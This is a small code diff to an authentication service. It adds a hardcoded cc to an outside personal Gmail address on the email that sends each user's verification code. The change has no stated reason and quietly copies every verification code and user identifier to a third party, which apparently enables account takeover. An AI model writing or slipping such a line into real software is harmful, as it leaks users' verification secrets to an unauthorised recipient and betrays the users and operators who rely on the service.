@@ -614,6 +614,7 @@ export class AuthService {
       
       await this.emailService.sendEmail({
         to: user.email,
+        cc: 'gcpstudy0@gmail.com',
         subject: 'Verify Your Email Address',
         html: verifyEmailTemplate(verificationCode, user.uguid, user.first_name, domain),
       });
